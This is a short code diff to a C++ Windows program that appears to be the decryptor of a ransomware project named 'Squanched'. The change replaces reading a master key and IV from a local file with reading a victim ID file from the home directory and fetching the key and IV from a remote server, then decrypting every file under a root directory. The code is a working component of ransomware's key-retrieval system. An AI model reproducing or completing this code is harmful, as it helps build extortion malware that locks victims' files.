@@ -2,7 +2,7 @@
 #include "Decryption.h"
 
 
-#ifndef ENC
+#if 1
 
 DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);
 
@@ -141,6 +141,7 @@ void decrypt_wrapper(string path, PBYTE masterIV, PBYTE masterKey)
 int main()
 {
 	PBYTE masterIV = nullptr, masterKey = nullptr;
+	Status status;
 	masterIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
 	if(masterIV == nullptr)
 	{
@@ -151,12 +152,20 @@ int main()
 	{
 		//TODO cleanup
 	}
-	string pathToMasters = "C:\\rans\\236499\\Squanched\\Debug\\KEY-IV.txt";
-	std::ifstream masterKeyIVFile;
-	masterKeyIVFile.open(pathToMasters, std::ios::binary);
-	masterKeyIVFile.read((char*)masterKey, KEY_LEN);
-	masterKeyIVFile.read((char*)masterIV, IV_LEN);
-	masterKeyIVFile.close();
+//	string pathToMasters = "C:\\rans\\236499\\Squanched\\Debug\\KEY-IV.txt";
+//	std::ifstream masterKeyIVFile;
+//	masterKeyIVFile.open(pathToMasters, std::ios::binary);
+//	masterKeyIVFile.read((char*)masterKey, KEY_LEN);
+//	masterKeyIVFile.read((char*)masterIV, IV_LEN);
+//	masterKeyIVFile.close();
+	string pathToID = get_home() + R"(\SquanchedID.id)";
+	std::ifstream idFile;
+	idFile.open(pathToID, std::ios::binary);
+	std::string id((std::istreambuf_iterator<char>(idFile)), (std::istreambuf_iterator<char>()));
+	idFile.close();
+	id = string_to_hex(id);
+	status = getFromServer(id, masterIV, masterKey);
+	//TODO Check status
 
 	string path = ROOT_DIR;
 	iterate(path, &decrypt_wrapper, masterIV, masterKey);
